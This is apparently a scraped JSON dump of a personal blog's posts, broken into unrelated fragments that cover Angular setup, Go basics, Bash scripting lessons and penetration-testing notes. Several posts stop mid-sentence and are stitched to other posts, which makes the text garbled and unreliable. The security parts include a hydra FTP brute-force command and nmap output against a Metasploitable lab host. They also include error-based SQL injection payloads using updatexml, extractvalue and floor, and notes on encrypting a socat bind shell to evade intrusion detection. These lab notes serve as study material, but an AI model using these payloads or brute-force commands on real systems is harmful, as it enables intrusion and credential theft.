To install Angular on your local system, you need the following: Node.js:Angular requires an active LTS or maintenance LTS version of Node.js.Here’s the newest version in nodejs.org&#x2F;en:If you are unsure what version of Node.js runs on your system, run node -v in a terminal window.12node -vv16.17.1 npm Package Manager:Angular, the Angular CLI, and Angular applications depend on npm packages for many features and functions. To download and install npm packages, you need an npm package manager. This guide uses the npm client command line interface, which is installed with Node.js by default. To check that you have the npm client installed, run npm -v in a terminal window. Install the Angular CLI To install the Angular CLI, open a terminal window and run the following command: 1npm install -g @angular/cli Create a workspace and initial application You develop apps in the context of an Angular workspace. To create a new workspace and initial starter app: 1. Run the CLI command ng new and provide the name my-app, as shown here: 1ng new my-app 2. The ng new command prompts you for information about features to include in the initial app. Accept the defaults by pressing the Enter or Return key. The Angular CLI installs the necessary Angular npm packages and other dependencies. This can take a few minutes. The CLI creates a new workspace and a simple Welcome app, ready to run. Run the application The Angular CLI includes a server, for you to build and serve your app locally. Navigate to the workspace folder, such as my-app. Run the following command: 12cd my-appng serve --open The ng serve command launches the server, watches your files, and rebuilds the app as you make changes to those files. The –open (or just -o) option automatically opens your browser to http://localhost:4200/. If your installation and setup was successful, you should see a page similar to the following. Compile and Package Angular CLI also provides commands: 1ng build --prod Among them, the parameter –prod tells the compilation environment to compile for the production environment package. Similarly, in the ‘angular.json’ file, default compilation parameters are defined, and if necessary, they can be modified. The main configuration parameters are as follows. 123456789101112131415&quot;configurations&quot;: &#123; ... &quot;budgets&quot;: [ &#123; &quot;type&quot;: &quot;initial&quot;, &quot;maximumWarning&quot;: &quot;5mb&quot;, &quot;maximumError&quot;: &quot;10mb&quot; &#125;, &#123; &quot;type&quot;: &quot;anyComponentStyle&quot;, &quot;maximumWarning&quot;: &quot;1mb&quot;, &quot;maximumError&quot;: &quot;4mb&quot; &#125; ],&#125; Angular, by default, compiles to the ‘dist’ directory under the root directory, generating pure static files (html, css, js), as well as image files. Deploy to a Server Using the “phpStudy” tool, go into its root directory, which is usually something like “C:\\phpStudy\\PHPTutorial\\WWW.” Copy all the files from the ‘dist’ directory to the root directory “C:\\phpStudy\\PHPTutorial\\WWW.” Restart phpStudy’s services to make sure the changes take effect. Open your Chrome browser, and you should be able to access the website by entering the following URL in the address bar: http://localhost/index.html Make sure you have the correct directory paths, and that the files from the ‘dist’ directory are copied over to the correct location in the root directory. Additionally, ensure that the web server and PHP services in phpStudy are correctly configured and running.","categories":[{"name":"Angular from Beginner to Hero","slug":"Angular-from-Beginner-to-Hero","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/"},{"name":"(1) Setting up the Local Environment and Workspace","slug":"Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"}],"tags":[]},{"title":"VSFTPD 2.3.4 exploit","slug":"VSFTPD2-3-4pentest","date":"2021-03-06T02:42:06.000Z","updated":"2024-01-05T22:20:45.004Z","comments":true,"path":"2021/03/05/VSFTPD2-3-4pentest/","link":"","permalink":"http://example.com/2021/03/05/VSFTPD2-3-4pentest/","excerpt":"","text":"[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC Network Scan 123456789101112131415161718192021222324┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# nmap -A -sV 192.168.244.136Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 15:58 ESTNmap scan report for 192.168.244.136 (192.168.244.136)Host is up (0.00064s latency).Not shown: 977 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.244.140| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status VSFTPD 2.3.4 exploit with hydra First , we need construct dictionaries about username and passwordhere’s the dictionaries which usernames named usernames.txt and passwords named passwords.txt then , we use the tools hydra with the follow command line: 1hydra -L /home/kali/Desktop/cd/mywordlists/usernames.txt -P /home/kali/Desktop/cd/mywordlists/passwords.txt 192.168.244.136 ftp -V here’s the command line ouput looks like: 1234567891011121314151617181920212223242526272829303132333435Hydra v9.1 (c) 2020 by van Hauser/THC &amp;

Assuming the math.go file is as follows: 1234567// math.gopackage mainfunc Add(a, b int) int &#123; return a + b&#125; You can then create a math_test.go file to write your test code: 12345678910111213// math_test.gopackage mainimport &quot;testing&quot;func TestAdd(t *testing.T) &#123; result := Add(2, 3) expected := 5 if result != expected &#123; t.Errorf(&quot;Add(2, 3) returned %d, expected %d&quot;, result, expected) &#125;&#125; In math_test.go, we import the testing package and write a test function named TestAdd. Test functions should start with ‘Test’ and accept a *testing.T parameter, which is used to report test failures. Inside the TestAdd function, we call Add(2, 3) to execute the function being tested and compare the result to the expected value. If the result doesn’t match the expected value, we use t.Errorf to report the test failure with detailed error information. Next, you can run the tests using the ‘go test‘ command in your terminal: 1go test Go will search for all the _test.go files in the current directory and execute the test functions within them. If the tests pass, you’ll see a success message. If the tests fail, you’ll get detailed failure information. This is just a very basic example. In real-world projects, you can write more test cases to cover various scenarios and ensure that your code works correctly in different situations.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Unit Test","slug":"Go/Unit-Test","permalink":"http://example.com/categories/Go/Unit-Test/"}],"tags":[]},{"title":"nil in the Go language","slug":"goNil","date":"2019-01-04T03:59:12.000Z","updated":"2023-10-17T15:38:41.786Z","comments":true,"path":"2019/01/03/goNil/","link":"","permalink":"http://example.com/2019/01/03/goNil/","excerpt":"","text":"In the Go language, “nil“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “nil“: Pointer and Reference Types: The most common use of “nil“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “nil“ is used in the following cases: 123var ptr *int // Declare an integer pointer, its zero value is nilvar slice []int // Declare an integer slice, its zero value is nilvar m map[string]int // Declare a map, its zero value is nil Interface Types: “nil“ can also be used with interface types, signifying that an interface has no specific implemented value.

Here are some important features and uses of defer: Deferred Execution: Using the defer keyword ensures that a function call is executed before the containing function returns, whether it returns normally or due to an error. Resource Cleanup: Common use cases include closing files, releasing locks, closing database connections, and other cleanup operations to prevent resource leaks. Parameter Evaluation: The parameters in a defer statement are evaluated when the defer statement is executed, not when the function returns.

Below, I will provide examples of the usage and differences between these two concepts: Closure Example:A closure refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables. 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() &#123; outerVar := 10 // Closure function closure := func() &#123; fmt.Println(&quot;Outer variable outerVar:&quot;, outerVar) &#125; // Call the closure function closure() // Output: Outer variable outerVar: 10 // Modify the outer variable outerVar = 20 // Call the closure function again closure() // Output: Outer variable outerVar: 20&#125; In the above example, closure is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function. Anonymous Function Example: An anonymous function is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions. 1234567891011121314151617181920package mainimport &quot;fmt&quot;func main() &#123; // Define and call an anonymous function result := func(x, y int) int &#123; return x + y &#125;(5, 3) fmt.Println(&quot;Result of the anonymous function:&quot;, result) // Output: Result of the anonymous function: 8 // Assign an anonymous function to a variable add := func(x, y int) int &#123; return x + y &#125; sum := add(10, 20) fmt.Println(&quot;Calling the anonymous function using a variable:&quot;, sum) // Output: Calling the anonymous function using a variable: 30&#125; In the above example, we define an anonymous function and call it directly. We also assign another anonymous function to the add variable and use that variable to call the function. To summarize the differences: A closure is a function that captures external variables and can access and modify them outside of the function.An anonymous function is a function without a name, which can be assigned to a variable or passed as an argument to other functions.It’s important to note that while closures often involve anonymous functions, not all anonymous functions are closures. A closure is a specific type of anonymous function that captures external variables.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Closure and Anonymous Function","slug":"Go/Closure-and-Anonymous-Function","permalink":"http://example.com/categories/Go/Closure-and-Anonymous-Function/"}],"tags":[]},{"title":"A Brief Summary of \"go func()\"","slug":"goFunc","date":"2018-11-17T04:00:34.000Z","updated":"2023-10-23T14:48:54.676Z","comments":true,"path":"2018/11/16/goFunc/","link":"","permalink":"http://example.com/2018/11/16/goFunc/","excerpt":"","text":"“go func()” is a way in the Go programming language to launch new concurrent goroutines. A goroutine is a lightweight thread in Go used for concurrent task execution. Using “go func()” allows you to create new concurrent execution flows in your program without the need to explicitly create threads or manage the complexity of thread management. Here is a basic example and some key concepts of using “go func()”: Basic Example: 1234567func main() &#123; go func() &#123; // Place the code you want to execute in a new concurrent goroutine here &#125;() // The main goroutine continues to execute other work&#125; In the example above, “go func()” starts a concurrent goroutine for an anonymous function, which will execute the code inside it. The main goroutine continues to execute other tasks, while the new concurrent goroutine runs in the background. Key Concepts: Anonymous Function: Anonymous functions are typically used to define “go func()” because there’s no need to name the concurrent goroutine. The code for the anonymous function can be enclosed in {} as needed. Concurrent Execution: Goroutines launched with “go func()” run concurrently in the background without blocking the main program’s execution. This allows you to execute multiple tasks simultaneously, improving program performance. Data Sharing: Concurrent goroutines can share data, but it’s important to handle shared data carefully to avoid race conditions and data races. You can use tools provided by the “sync” package to manage access to shared data. Goroutine Management: Go’s runtime system is responsible for creating, scheduling, and destroying goroutines. You don’t need to worry about the complexity of thread creation and destruction. Waiting for Goroutines to Complete: If you need to wait for concurrent goroutines to finish, you can use mechanisms like “sync.WaitGroup” or channels to implement waiting. Using “go func()” is a simple way to achieve concurrency in the Go programming language, allowing you to run tasks in parallel, such as handling concurrent requests, performing background tasks, or other work that needs to execute simultaneously. However, be cautious about handling concurrency issues and ensuring that shared data is synchronized and accessed correctly.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"go func()","slug":"Go/go-func","permalink":"http://example.com/categories/Go/go-func/"}],"tags":[{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"}]},{"title":"Socat","slug":"Pentest-socat","date":"2016-12-06T00:26:27.000Z","updated":"2023-10-21T22:00:20.508Z","comments":true,"path":"2016/12/05/Pentest-socat/","link":"","permalink":"http://example.com/2016/12/05/Pentest-socat/","excerpt":"","text":"Socat is a command-line utility that establishes two bidirectional byte streams and transfers databetween them.

This level ofencryption will assist in evading intrusion detection systems (IDS) and will help hide the sensitivedata we are transceiving.To continue with the example, we will use the openssl application to create a selfsigned certificate using the following options:• req: initiate a new certificate signing request• -newkey: generate a new private key• rsa:2048: use RSA encryption with a 2,048-bit key length.• -nodes: store the private key without passphrase protection• -keyout: save the key to a file• -x509: output a self-signed certificate instead of a certificate request• -days: set validity period in days• -out: save the certificate to a file Once we generate the key, we will cat the certificate and its private key into a file, which we willeventually use to encrypt our bind shell.

If the format is incorrect, an error will occur. Subsequent steps for updatexml-based error-based injection: (1). Modify the SQL statement for selecting the user position.(2). Retrieve tables in the current database.(3). Retrieve columns of a specific table.(4). Continue step by step. Utilizing the extravalue() function: Payload: 1?id=1&#x27; and (extravalue(1,concat(0x7e,(select user()),0x7e)))--+ extravalue() function is similar to updatexml() and is used for querying node content in an XML document.Subsequent steps for extravalue-based error-based injection are the same as for updatexml. Utilizing the floor() function: Payload: 1?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+ The principle utilized is the repetition of primary keys due to the repetitiveness of floor(rand(0)*2), leading to an error in the group by statement.The group by key principle involves looping through every row of data and saving the results in a temporary table. When reading each row’s key, if the key exists in the temporary table, it won’t update the temporary table’s data. If the key doesn’t exist, it will insert the key’s row data into the temporary table.

Rather than re-writing the samechunk of code over and over, we just write it once as a function and then call that function asneeded.Put another way, a function is a subroutine, or a code block that implements a set of operations–a“black box” that performs a specified task. Functions may be written in two different formats. Thefirst format is more common to Bash scripts: 123function function_name &#123; commands...&#125; The second format is more familiar to C programmers: 123function_name () &#123; commands...&#125; The formats are functionally identical and are a matter of personal preference. Let’s look at a simple example: 12345678910kali@kali:~$ cat ./func.sh#!/bin/bash# function exampleprint_me () &#123; echo &quot;You have been printed!&quot;&#125;print_mekali@kali:~$ chmod +x ./func.shkali@kali:~$ ./func.shYou have been printed! Functions can also accept arguments: 12345678910kali@kali:~$ cat ./funcarg.sh#!/bin/bash# passing arguments to functionspass_arg() &#123; echo &quot;Today&#x27;s random number is: $1&quot;&#125;pass_arg $RANDOMkali@kali:~$ chmod +x ./funcarg.shkali@kali:~$ ./funcarg.shToday&#x27;s random number is: 25228 In this case, we passed a random number, $RANDOM, into the function, which outputs it as $1, thefunctions first argument. Note that the function definition (pass_arg()) contains parentheses. Inother programming languages, such as C, these would contain the expected arguments, but inBash the parentheses serve only as decoration. They are never used. Also note that the functiondefinition (the function itself) must appear in the script before it is called. Logically, we can’t callsomething we have not defined. In addition to passing arguments to Bash functions, we can of course return values from Bashfunctions as well. Bash functions do not actually allow you to return an arbitrary value in thetraditional sense. Instead, a Bash function can return an exit status (zero for success, non-zero forfailure) or some other arbitrary value that we can later access from the $? global variable (see Table prev article). Alternatively, we can set a global variable inside the function or use command substitution tosimulate a traditional return.Let’s look at a simple example that returns a random number into $?: 12345678910111213141516kali@kali:~$ cat funcrvalue.sh#!/bin/bash# function return value examplereturn_me() &#123; echo &quot;Oh hello there, I&#x27;m returning a random value!&quot; return $RANDOM&#125;return_meecho &quot;The previous function returned a value of $?&quot;kali@kali:~$ chmod +x ./funcrvalue.shkali@kali:~$ ./funcrvalue.shOh hello there, I&#x27;m returning a random value!The previous function returned a value of 123kali@kali:~$ ./funcrvalue.shOh hello there, I&#x27;m returning a random value!The previous function returned a value of 432 Notice that a random number is returned every time we run the script, because we returned thespecial global variable $RANDOM (into $?). If we used the return statement without the $RANDOMargument, the exit status of the function (0 in this case) would be returned instead.Now that we have a basic understanding of variables and functions, we can dig deeper and discussvariable scope.The scope of a variable is simply the context in which it has meaning. By default, a variable has aglobal scope, meaning it can be accessed throughout the entire script. In contrast, a local variablecan only be seen within the function, block of code, or subshell in which it is defined. We can“overlay” a global variable, giving it a local context, by preceding the declaration with the localkeyword, leaving the global variable untouched. The general syntax is: 1local name=&quot;Joe&quot; Let’s see how local and global variables work in practice with a simple example: 123456789101112131415161718kali@kali:~$ cat ./varscope.sh#!/bin/bash# var scope examplename1=&quot;John&quot;name2=&quot;Jason&quot;name_change() &#123; local name1=&quot;Edward&quot; echo &quot;Inside of this function, name1 is $name1 and name2 is $name2&quot; name2=&quot;Lucas&quot;&#125;echo &quot;Before the function call, name1 is $name1 and name2 is $name2&quot;name_changeecho &quot;After the function call, name1 is $name1 and name2 is $name2&quot;kali@kali:~$ chmod +x ./varscope.shkali@kali:~$ ./varscope.shBefore the function call, name1 is John and name2 is JasonInside of this function, name1 is Edward and name2 is JasonAfter the function call, name1 is John and name2 is Lucas Let’s highlight a few key points within the code. First note that we declared two global variables,setting name1 to John and name2 to Jason.Then, we defined a function and inside that function, declared a local variable called name1, settingthe value to Edward. Since this was a local variable, the previous global assignment was notaffected; name1 will still be set to John outside this function.Next, we set name2 to Lucas, and since we did not use the local keyword, we are changing theglobal variable, and the assignment sticks both inside and outside of the function.Based on this example, the following two points summarize variable scope:• Changing the value of a local variable with the same name as a global one will not affect itsglobal value.• Changing the value of a global variable inside of a function – without having declared a localvariable with the same name – will affect its global value.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 09 - Functions","slug":"Bash/Bash-Scripting-09-Functions","permalink":"http://example.com/categories/Bash/Bash-Scripting-09-Functions/"}],"tags":[]},{"title":"Bash Scripting 08 - While Loops","slug":"BashScript08-WhileLoops","date":"2012-03-25T03:17:12.000Z","updated":"2023-10-24T01:53:37.285Z","comments":true,"path":"2012/03/24/BashScript08-WhileLoops/","link":"","permalink":"http://example.com/2012/03/24/BashScript08-WhileLoops/","excerpt":"","text":"While loops are also fairly common and execute code while an expression is true.

Iteration is particularly useful for penetration testers, so we recommend paying veryclose attention to this section.In Bash, the two most predominant loop commands are for and while. We will take a look at both. For loops are very practical and work very well in Bash one-liners. This type of loop is used toperform a given set of commands for each of the items in a list. Let’s briefly look at its generalsyntax: 1234for var-name in &lt;list&gt;do&lt;action to perform&gt;done The for loop will take each item in the list (in order), assign that item as the value of the variable varname, perform the given action between do and done, and then go back to the top, grab the nextitem in the list, and repeat the steps until the list is exhausted. Let’s take a look at a more practical example that will quickly print the first 10 IP addresses in the10.11.1.0&#x2F;24 subnet: 1234567891011kali@kali:~$ for ip in $(seq 1 10); do echo 10.11.1.$ip; done10.11.1.110.11.1.210.11.1.310.11.1.410.11.1.510.11.1.610.11.1.710.11.1.810.11.1.910.11.1.10 In this Bash one-liner, we used the seq command to print a sequence of numbers, inthis case the numbers one through ten. Each number is then assigned to the ip variable, and theneach IP address is displayed to the screen as the for loop runs multiple times, exiting at the end ofthe sequence.Another way of re-writing the previous for loop involves brace expansion using ranges. Braceexpansion using ranges is written giving the first and last values of the range and can be a sequenceof numbers or characters. This is known as a “sequence expression”: 1234567891011kali@kali:~$ for i in &#123;1..10&#125;; do echo 10.11.1.$i;done10.11.1.110.11.1.210.11.1.310.11.1.410.11.1.510.11.1.610.11.1.710.11.1.810.11.1.910.11.1.10 There is a lot of potential for this type of loop. Displaying IP addresses to the screen may not seemvery useful, but we can use the same loop to run a port scan using nmap (which we discuss indetail in another module). We can also attempt to use the ping command to see if any of the IPaddresses respond to ICMP echo requests, etc.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 07 - For Loops","slug":"Bash/Bash-Scripting-07-For-Loops","permalink":"http://example.com/categories/Bash/Bash-Scripting-07-For-Loops/"}],"tags":[]},{"title":"Bash Scripting 06 - Boolean Logical Operations","slug":"BashScript06-BooleanLogicalOperations","date":"2012-03-20T03:11:03.000Z","updated":"2023-10-24T01:53:28.806Z","comments":true,"path":"2012/03/19/BashScript06-BooleanLogicalOperations/","link":"","permalink":"http://example.com/2012/03/19/BashScript06-BooleanLogicalOperations/","excerpt":"","text":"Boolean logical operators, like AND (&amp;&amp;) and OR (||) are somewhat mysterious because Bashuses them in a variety of ways.One common use is in command lists, which are chains of commands whose flow is controlled byoperators. The “|” (pipe) symbol is a commonly-used operator in a command list and passes theoutput of one command to the input of another. Similarly, boolean logical operators executecommands based on whether a previous command succeeded (or returned True or 0) or failed(returned False or non-zero).Let’s take a look at the AND (&amp;&amp;) boolean operator first, which executes a command only if theprevious command succeeds (or returns True or 0): 123456kali@kali:~$ user2=kalikali@kali:~$ grep $user2 /etc/passwd &amp;&amp; echo &quot;$user2 found!&quot;kali:x:1000:1000:,,,:/home/kali:/bin/bashkali found!kali@kali:~$ user2=bobkali@kali:~$ grep $user2 /etc/passwd &amp;&amp; echo &quot;$user2 found!&quot; In this example, we first assigned the username we are searching for to the user2 variable. Next,we use the grep command to check if a certain user is listed in the /etc/passwd file, and if it is,grep returns True and the echo command is executed. However, when we try searching for a userthat we know does not exist in the /etc/passwd file, our echo command is not executed. When used in a command list, the OR (||) operator is the opposite of AND (&amp;&amp;); it executes the nextcommand only if the previous command failed (returned False or non-zero): 12345kali@kali:~$ echo $user2bobkali@kali:~$ grep $user2 /etc/passwd &amp;&amp; echo &quot;$user2 found!&quot; || echo &quot;$user2 not found!&quot;bob not found! In the above example, we took our previous command a step further and added the OR (||) operatorfollowed by a second echo command. Now, when grep does not find a matching line and returnsFalse, the second echo command after the OR (||) operator is executed instead.These operators can also be used in a test to compare variables or the results of other tests. Whenused this way, AND (&amp;&amp;) combines two simple conditions, and if they are both true, the combinedresult is success (or True or 0).Consider this example: 123456789101112131415kali@kali:~$ cat ./and.sh#/bin/bash# and exampleif [ $USER == &#x27;kali&#x27; ] &amp;&amp; [ $HOSTNAME == &#x27;kali&#x27; ]thenecho &quot;Multiple statements are true!&quot;elseecho &quot;Not much to see here...&quot;fikali@kali:~$ chmod +x ./and.shkali@kali:~$ ./and.shMultiple statements are true!kali@kali:~$ echo $USER &amp;&amp; echo $HOSTNAMEkalikali In this example, we used AND (&amp;&amp;) to test multiple conditions and since both variable comparisonswere true, the whole if line succeeded, so the then branch executed.When used in a test, the OR (||) boolean operator is used to test one or more conditions, but onlyone of them has to be true to count as success.Let’s take a look at an example: 123456789101112131415kali@kali:~$ cat ./or.sh#!/bin/bash# or exampleif [ $USER == &#x27;kali&#x27; ] || [ $HOSTNAME == &#x27;pwn&#x27; ]thenecho &quot;One condition is true, this line is printed&quot;elseecho &quot;You are out of luck!&quot;fikali@kali:~$ chmod +x ./or.shkali@kali:~$ ./or.shOne condition is true, this line is printedkali@kali:~$ echo $USER &amp;&amp; echo $HOSTNAMEkalikali In this example, we used OR (||) to test multiple conditions and since one of the variablecomparisons was true, the whole if line succeeded, so the then branch executed.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 06 - Boolean Logical Operations","slug":"Bash/Bash-Scripting-06-Boolean-Logical-Operations","permalink":"http://example.com/categories/Bash/Bash-Scripting-06-Boolean-Logical-Operations/"}],"tags":[]},{"title":"Bash Scripting 05 - If, Else, Elif Statements","slug":"BashScript05-IfElseElifStatements","date":"2012-03-18T02:24:49.000Z","updated":"2023-10-24T01:53:23.558Z","comments":true,"path":"2012/03/17/BashScript05-IfElseElifStatements/","link":"","permalink":"http://example.com/2012/03/17/BashScript05-IfElseElifStatements/","excerpt":"","text":"Conditional statements allow us to perform different actions based on different conditions. Themost common conditional Bash statements include if, else, and elif.The if statement is relatively simple–it checks to see if a condition is true–but it requires a veryspecific syntax. Pay careful attention to this syntax, especially the use of required spaces: 1234if [ &lt;some test&gt; ]then&lt;perform an action&gt;fi In this listing, if “some test” evaluates as true, the script will “perform an action”, or any commandsbetween then and fi. Let’s look at an actual example: 123456789101112kali@kali:~$ cat ./if.sh#!/bin/bash# if statement exampleread -p &quot;What is your age: &quot; ageif [ $age -lt 16 ]thenecho &quot;You might need parental permission to take this course!&quot;fikali@kali:~$ chmod +x ./if.shkali@kali:~$ ./if.shWhat is your age: 15You might need parental permission to take this course! In this example, we used an if statement to check the age entered by a user. If the entered age wasless than (-lt) 16, the script would output a warning message.The square brackets (“[“ and “]”) in the if statement above are actually a reference to the testcommand. This simply means we can use all of the operators that are allowed by the testcommand. Some of the most common operators include: Operator Description: Expression True if… !EXPRESSION The EXPRESSION is false. -n STRING STRING length is greater than zero -z STRING The length of STRING is zero (empty) STRING1 !&#x3D; STRING2 STRING1 is not equal to STRING2 STRING1 &#x3D; STRING2 STRING1 is equal to STRING2 INTEGER1 -eq INTEGER2 INTEGER1 is equal to INTEGER2 INTEGER1 -ne INTEGER2 INTEGER1 is not equal to INTEGER2 INTEGER1 -gt INTEGER2 INTEGER1 is greater than INTEGER2 INTEGER1 -lt INTEGER2 INTEGER1 is less than INTEGER2 INTEGER1 -ge INTEGER2 INTEGER1 is greater than or equal to INTEGER 2 INTEGER1 -le INTEGER2 INTEGER1 is less than or equal to INTEGER 2 -d FILE FILE exists and is a directory -e FILE FILE exists -r FILE FILE exists and has read permission -s FILE FILE exists and it is not empty -w FILE FILE exists and has write permission -x FILE FILE exists and has execute permission With the above in mind, our previous example using if can be rewritten without square brackets asfollows: 123456789101112kali@kali:~$ cat ./if2.sh#!/bin/bash# if statement example 2read -p &quot;What is your age: &quot; ageif test $age -lt 16thenecho &quot;You might need parental permission to take this course!&quot;fikali@kali:~$ chmod +x ./if2.shkali@kali:~$ ./if2.shWhat is your age: 15You might need parental permission to take this course! Even though this example is functionally equivalent to the example using square brackets, usingsquare brackets makes the code slightly easier to read.We can also perform a certain set of actions if a statement is true and another set if it is false. Todo this, we can use the else statement, which has the following syntax: 123456if [ &lt;some test&gt; ]then&lt;perform action&gt;else&lt;perform another action&gt;fi Let’s extend our previous “age” example to include the else statement: 1234567891011121314kali@kali:~$ cat ./else.sh#!/bin/bash# else statement exampleread -p &quot;What is your age: &quot; ageif [ $age -lt 16 ]thenecho &quot;You might need parental permission to take this course!&quot;elseecho &quot;Welcome to the course!&quot;fikali@kali:~$ chmod +x ./else.shkali@kali:~$ ./else.shWhat is your age: 21Welcome to the course! Notice that the else statement was executed when the entered age was greater than (or morespecifically “not less than”) sixteen.The if and else statements only allow two code execution branches. We can add additionalbranches with the elif statement which uses the following pattern: 123456789if [ &lt;some test&gt; ]then&lt;perform action&gt;elif [ &lt;some test&gt; ]then&lt;perform different action&gt;else&lt;perform yet another different action&gt;fi Let’s again extend our “age” example to include the elif statement: 1234567891011121314151617kali@kali:~$ cat ./elif.sh#!/bin/bash# elif exampleread -p &quot;What is your age: &quot; ageif [ $age -lt 16 ]thenecho &quot;You might need parental permission to take this course!&quot;elif [ $age -gt 60 ]thenecho &quot;Hats off to you, respect!&quot;elseecho &quot;Welcome to the course!&quot;fikali@kali:~$ chmod +x ./elif.shkali@kali:~$ ./elif.shWhat is your age: 65Hats off to you, respect! In this example, the code execution flow was slightly more complex. In order of operation, the thenbranch executes if the entered age is less than sixteen, the elif branch is entered (and the “Hatsoff..” message displayed) if the age is greater than sixty, and the else branch executes only if theage is greater than sixteen but less than sixty.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 05 - If, Else, Elif Statements","slug":"Bash/Bash-Scripting-05-If-Else-Elif-Statements","permalink":"http://example.com/categories/Bash/Bash-Scripting-05-If-Else-Elif-Statements/"}],"tags":[]},{"title":"Bash Scripting 04 - Reading User Input","slug":"BashScript04-ReadingUserInput","date":"2012-03-14T01:21:31.000Z","updated":"2023-10-24T01:49:39.848Z","comments":true,"path":"2012/03/13/BashScript04-ReadingUserInput/","link":"","permalink":"http://example.com/2012/03/13/BashScript04-ReadingUserInput/","excerpt":"","text":"Command-line arguments are a form of user input, but we can also capture interactive user inputwhile a script is running with the read command.

We can set (or “declare”) a variable, whichassigns a value to it, or read a variable, which will “expand” or “resolve” it to its stored value. We can declare variable values in a number of ways. The easiest method is to set the value directlywith a simple name&#x3D;value declaration. Notice that there are no spaces before or after the “&#x3D;” sign: 1kali@kali:~$ first_param=Super Declaring a variable is pointless unless we can reference it. To do this, we precede the variable withthe “$” character. Whenever Bash encounters this syntax in a command, it replaces the variablename with its value (“expands” the variable) before execution: 1234kali@kali:~$ first_param=Superkali@kali:~$ last_param=Herokali@kali:~$ echo $first_param $last_paramSuper Hero Variable names may be uppercase, lowercase, or a mixture of both. However, Bash is casesensitive so we must be consistent when declaring and expanding variables. In addition, it’s goodpractice to use descriptive variable names, which make our scripts much easier to read andmaintain. Be advised that Bash interprets certain characters in specific ways. For example, this declarationdemonstrates an improper multi-value variable declaration: 12kali@kali:~$ greeting=Hello Worldbash: World: command not found This was not necessarily what we expected. To fix this, we can use either single quotes (‘) or doublequotes (“) to enclose our text. However, Bash treats single and double quotes differently. Whenencountering single quotes, Bash interprets every enclosed character literally. When enclosed indouble quotes, all characters are viewed literally except “$”, “&#96;”, and “&quot; meaning variables will beexpanded in an initial substitution pass on the enclosed text. A simple example will help clarify this: 123456kali@kali:~$ greeting=&#x27;Hello World&#x27;kali@kali:~$ echo $greetingHello Worldkali@kali:~$ greeting2=&quot;New $greeting&quot;kali@kali:~$ echo $greeting2New Hello World In this example, the single-quote-enclosed declaration of greeting preserved the value of our textexactly and did not interpret the space as a command delimiter. However, in the double-quoteenclosed declaration of greeting2, Bash expanded $greeting to its value (“Hello World”), honoringthe special meaning of the “$” character.We can also set the value of the variable to the result of a command or program. This is known ascommand substitution, which allows us to take the output of a command or program (whatwould normally be printed to the screen) and have it saved as the value of a variable.To do this, place the variable name in parentheses “()”, preceded by a “$” character: 123kali@kali:~$ user=$(whoami)kali@kali:~$ echo $userkali Here we assigned the output of the whoami command to the user variable. We thendisplayed its value. An alternative syntax for command substitution using the backtick, or grave,character (&#96;) is shown below: 123kali@kali:~$ user2=`whoami`kali@kali:~$ echo $user2kali The backtick method is older and typically discouraged as there are differences in how the twomethods of command substitution behave. It is also important to note that commandsubstitution happens in a subshell and changes to variables in the subshell will not alter variablesfrom the master process. This is demonstrated in the following example: 123456789101112131415161718192021222324kali@kali:~$ cat ./subshell.sh#!/bin/bash -xvar1=value1echo $var1var2=value2echo $var2$(var1=newvar1)echo $var1`var2=newvar2`echo $var2kali@kali:~$ ./subshell.sh+ var1=value1+ echo value1value1+ var2=value2+ echo value2value2++ var1=newvar1+ echo value1value1++ var2=newvar2+ echo value2value2kali@kali:~$ In this example, first note that we changed the shebang, adding in the -x flag. This instructed Bashto print additional debug output, so we could more easily see the commands that were executedand their results. As we view this output, notice that commands preceded with a single “+” characterwere executed in the current shell and commands preceded with a double “++” were executed in asubshell.This allows us to clearly see that the second declarations of var1 and var2 happened inside asubshell and did not change the values in the current shell as the initial declarations did.","categories":[{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 02 - Variables","slug":"Bash/Bash-Scripting-02-Variables","permalink":"http://example.com/categories/Bash/Bash-Scripting-02-Variables/"}],"tags":[]},{"title":"Bash Scripting 01 - Intro to Bash Scripting","slug":"BashScript01-IntroduceBashScript","date":"2012-03-03T03:27:59.000Z","updated":"2023-10-24T01:48:25.168Z","comments":true,"path":"2012/03/02/BashScript01-IntroduceBashScript/","link":"","permalink":"http://example.com/2012/03/02/BashScript01-IntroduceBashScript/","excerpt":"","text":"The GNU Bourne-Again Shell (Bash) is a powerful work environment and scripting engine. Acompetent security professional skillfully leverages Bash scripting to streamline and automatemany Linux tasks and procedures. In this module, we will introduce Bash scripting and exploreseveral practical scenarios. A Bash script is a plain-text file that contains a series of commands that are executed as if they hadbeen typed at a terminal 